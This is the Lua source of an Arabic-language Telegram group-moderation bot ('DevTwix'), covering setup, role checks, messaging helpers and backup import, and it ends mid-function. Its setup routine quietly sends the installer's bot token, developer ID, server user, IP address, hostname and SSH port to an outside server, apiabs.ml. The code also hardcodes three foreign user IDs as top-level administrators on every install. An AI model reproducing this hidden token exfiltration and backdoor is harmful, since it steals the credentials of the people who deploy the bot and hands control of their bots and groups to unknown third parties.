DevHmD  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
---------------------------------------------------------------------------------------
local AutoSet = function() 
if not DevHmD:get(Server.."IdDevTwix") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي » \n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/DevTwix/index.php?Ban=DevTwix&Info&Id="..DevId)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••') 
os.execute('lua DevTwix.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevHmD:set(Server.."IdDevTwix",DevId) 
end ---ifok
else 
print('\27[1;31m•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••') 
end
os.execute('lua DevTwix.lua') 
end
end 
if not DevHmD:get(Server.."TokenDevTwix") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت » \n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\nالتوكن غير صحيح تاكد منه ثم ارسله\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevHmD:set(Server.."TokenDevTwix",TokenBot) 
end  
else 
print('\27[1;31m•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\nلم يتم حفظ توكن البوت ارسله مره اخرى\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••') 
end  
os.execute('lua DevTwix.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevHmD:get(Server.."IdDevTwix"),
TokenBot = DevHmD:get(Server.."TokenDevTwix"),
DevTwix = DevHmD:get(Server.."TokenDevTwix"):match("(%d+)"),
SudoIds = {DevHmD:get(Server.."IdDevTwix")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/DevTwix/index.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("DevTwix.sh", "w")  
file:write([[
#!/usr/bin/env HMDh
cd $HOME/DevTwix
token="]]..DevHmD:get(Server.."TokenDevTwix")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• •••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• •••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• •••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• •••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./DevTwix.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env HMDh
cd $HOME/DevTwix
while(true) do
rm -fr ../.telegram-cli
screen -S DevTwix -X kill
screen -S DevTwix ./DevTwix.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_DevTwix = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevHmD:del(Server.."IdDevTwix");DevHmD:del(Server.."TokenDevTwix")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_DevTwix() 
print("\27[36m"..[[          
 ____             _____          ___  __
|  _ \  _____   _|_   _|_      _(_) \/ /
| | | |/ _ \ \ / / | | \ \ /\ / / |\  /
| |_| |  __/\ V /  | |  \ V  V /| |/  \
|____/ \___| \_/   |_|   \_/\_/ |_/_/\_\

]]..'\27[m'.."\n\27[35mServer Information ⇠  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,332581832,1368021277,1990818758}
DevTwix = Config.DevTwix
TokenBot = Config.TokenBot
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس')
---------------------------------------------------------------------------------------
FilesPrint = "\27[35m".."\nAll Source Files Started ⇠  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••• ┉ ┉ ┉ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
---------------------------------------------------------------------------------------
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
---------------------------------------------------------------------------------------
function dl_cb(arg, data)
end
---------------------------------------------------------------------------------------
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
---------------------------------------------------------------------------------------
-------  HmDSudo  -------
function HmDSudo(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:HmDSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:SecondSudo:',msg.sender_user_id_) 
if Status or HmDSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(DevTwix) then  
var = true  
end  
return var  
end 
---------------------------------------------------------------------------------------
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:SudoBot:',msg.sender_user_id_) 
if Status or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----   HmDConstructor   ----
function HmDConstructor(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:HmDConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----   Owner   ----
function Owner(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Owner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or HmDConstructor(msg) or SudoBot(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----  HMDicConstructor  ----
function HMDicConstructor(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----    Constructor     ----
function Constructor(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HMDicConstructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
---------  Manager  --------
function Manager(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HMDicConstructor(msg) or Constructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
----------  Admin  ---------
function Admin(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HmDConstructor(msg) or HMDicConstructor(msg) or Constructor(msg) or Manager(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
---------Vip Member---------
function VipMem(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HmDConstructor(msg) or HMDicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------Mtte---------
function Mtte(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Mtte:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or HmDConstructor(msg) or HmDConstructor(msg) or HMDicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or HmDConstructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
--------- CleanerNum ----------
function CleanerNum(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or HmDConstructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
--------- CleanerMusic ----------
function CleanerMusic(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or HmDConstructor(msg) or HmDSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
---------------------------------------------------------------------------------------
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevHmD:sismember(DevTwix..'HmD:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------------------------------------------------------------------------------------
---------  BanAll  ---------
function BanAll(user_id)
if DevHmD:sismember(DevTwix..'HmD:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
---------------------------------------------------------------------------------------
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevHmD:sismember(DevTwix..'HmD:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
---------------------------------------------------------------------------------------
---------  MuteAll  --------
function MuteAll(user_id)
if DevHmD:sismember(DevTwix..'HmD:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
---------------------------------------------------------------------------------------
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
---------------------------------------------------------------------------------------
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
---------------------------------------------------------------------------------------
function DevTwixFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.DevTwix and msg then
FilesText = plugin.DevTwix(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
---------------------------------------------------------------------------------------
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
---------------------------------------------------------------------------------------
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= DevTwix:lower() then 
send(chat,msg.id_,"⋄︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"⋄︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"⋄︙عذرا الملف ليس بصيغة » Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..DevTwix..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevHmD:set(DevTwix.."HmD:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevHmD:sadd(DevTwix.."HmD:Groups",IdGps) 
DevHmD:set(DevTwix.."HmD:Lock:Bots"..IdGps,"del") DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'HmD:Lock:Links','HmD:Lock:Contact','HmD:Lock:Forwards','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:EditMsgs','HmD:Lock:Stickers','HmD:Lock:Farsi','HmD:Lock:Spam','HmD:Lock:WebLinks','HmD:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevHmD:set(DevTwix..Lock..IdGps,true)
end
if v.HmDConstructors then
for k,IdHmDConstructors in pairs(v.HmDConstructors) do
DevHmD:sadd(DevTwix..'HmD:HmDConstructor:'..IdGps,IdHmDConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.HMDicConstructors then
for k,IdHMDicConstructors in pairs(v.HMDicConstructors) do
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..IdGps,IdHMDicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevHmD:sadd(DevTwix..'HmD:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevHmD:sadd(DevTwix..'HmD:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevHmD:sadd(DevTwix..'HmD:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevHmD:sadd(DevTwix..'HmD:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevHmD:set(DevTwix.."HmD:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevHmD:set(DevTwix.."HmD:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"⋄︙تم رفع النسخه بنجاح \n⋄︙تم تفعيل جميع المجموعات \n⋄︙تم استرجاع مشرفين المجموعات \n⋄︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
---------------------------------------------------------------------------------------
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
---------------------------------------------------------------------------------------
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
---------------------------------------------------------------------------------------
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
---------------------------------------------------------------------------------------
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
---------------------------------------------------------------------------------------
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
---------------------------------------------------------------------------------------
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
---------------------------------------------------------------------------------------
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
---------------------------------------------------------------------------------------
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
---------------------------------------------------------------------------------------
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
---------------------------------------------------------------------------------------
function Dev_HmD(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
---------------------------------------------------------------------------------------
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
---------------------------------------------------------------------------------------
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
---------------------------------------------------------------------------------------
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
---------------------------------------------------------------------------------------
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
---------------------------------------------------------------------------------------
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
---------------------------------------------------------------------------------------
local HmDRank = function(msg) if SudoId(msg.sender_user_id_) then DevTwixTeam  = "المطور" elseif HmDSudo(msg) then DevTwixTeam = "المطور" elseif SecondSudo(msg) then DevTwixTeam = "المطور" elseif SudoBot(msg) then DevTwixTeam = "المطور" elseif Manager(msg) then DevTwixTeam = "المدير" elseif Admin(msg) then DevTwixTeam = "الادمن" else DevTwixTeam = "العضو" end return DevTwixTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(332581832) then DevTwixTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1990818758) then DevTwixTeam = 'مبرمجة السورس' elseif tonumber(user_id) == tonumber(1368021277) then DevTwixTeam = 'المطور الاساسي' elseif tonumber(user_id) == tonumber(DevTwix) then DevTwixTeam = 'البوت' elseif SudoId(user_id) then DevTwixTeam = 'المطور الاساسي' elseif DevHmD:sismember(DevTwix..'HmD:HmDSudo:', user_id) then DevTwixTeam = 'المطور الاساسي' elseif DevHmD:sismember(DevTwix..'HmD:SecondSudo:', user_id) then DevTwixTeam = 'المطور الاساسي²' elseif DevHmD:sismember(DevTwix..'HmD:SudoBot:', user_id) then DevTwixTeam = DevHmD:get(DevTwix.."HmD:SudoBot:Rd"..chat_id) or 'المطور' elseif DevHmD:sismember(DevTwix..'HmD:HmDConstructor:'..chat_id, user_id) then DevTwixTeam = 'المالك' elseif DevHmD:sismember(DevTwix..'HmD:Owner:', user_id) then DevTwixTeam = 'المالك' elseif DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..chat_id, user_id) then DevTwixTeam = DevHmD:get(DevTwix.."HmD:HMDicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevHmD:sismember(DevTwix..'HmD:Constructor:'..chat_id, user_id) then DevTwixTeam = DevHmD:get(DevTwix.."HmD:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevHmD:sismember(DevTwix..'HmD:Managers:'..chat_id, user_id) then DevTwixTeam = DevHmD:get(DevTwix.."HmD:Managers:Rd"..chat_id) or 'المدير' elseif DevHmD:sismember(DevTwix..'HmD:Admins:'..chat_id, user_id) then DevTwixTeam = DevHmD:get(DevTwix.."HmD:Admins:Rd"..chat_id) or 'الادمن' elseif DevHmD:sismember(DevTwix..'HmD:VipMem:'..chat_id, user_id) then  DevTwixTeam = DevHmD:get(DevTwix.."HmD:VipMem:Rd"..chat_id) or 'المميز' elseif DevHmD:sismember(DevTwix..'HmD:TG:'..chat_id, user_id) then  DevTwixTeam = DevHmD:get(DevTwix.."HmD:TG:Rd"..chat_id) or 'تاج' elseif DevHmD:sismember(DevTwix..'HmD:Gell:'..chat_id, user_id) then  DevTwixTeam = DevHmD:get(DevTwix.."HmD:GellRd"..chat_id) or 'جلب' 
elseif DevHmD:sismember(DevTwix..'HmD:Cleaner:'..chat_id, user_id) then  DevTwixTeam = DevHmD:get(DevTwix.."HmD:Cleaner:Rd"..chat_id) or 'المنظف' else DevTwixTeam = DevHmD:get(DevTwix.."HmD:mem:Rd"..chat_id) or 'العضو'  end return DevTwixTeam end
---------------------------------------------------------------------------------------
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(DevTwix) then  
var = true
elseif DevHmD:sismember(DevTwix..'HmD:HmDSudo:', user_id) then
var = true
elseif DevHmD:sismember(DevTwix..'HmD:SecondSudo:', user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:SudoBot:', user_id) then
var = true 
elseif DevHmD:sismember(DevTwix..'HmD:HmDConstructor:'..chat_id, user_id) then
var = true
elseif DevHmD:sismember(DevTwix..'HmD:Owner:'..chat_id, user_id) then
var = true
elseif DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..chat_id, user_id) then
var = true
elseif DevHmD:sismember(DevTwix..'HmD:Constructor:'..chat_id, user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:Managers:'..chat_id, user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:Admins:'..chat_id, user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function HmDDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevHmD:sismember(DevTwix..'HmD:HmDSudo:', user_id) then
var = 'HmDsudo'
elseif DevHmD:sismember(DevTwix..'HmD:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevHmD:sismember(DevTwix..'HmD:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevHmD:sismember(DevTwix..'HmD:HmDConstructor:'..chat_id, user_id) then
var = 'HmDConstructor'
elseif DevHmD:sismember(DevTwix..'HmD:Owner:'..chat_id, user_id) then
var = 'Owner'
elseif DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..chat_id, user_id) then
var = 'HMDicconstructor'
elseif DevHmD:sismember(DevTwix..'HmD:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevHmD:sismember(DevTwix..'HmD:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
---------------------------------------------------------------------------------------
local function Filters(msg, value)
local HmD = (DevTwix..'HmD:Filters:'..msg.chat_id_)
if HmD then
local names = DevHmD:hkeys(HmD)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
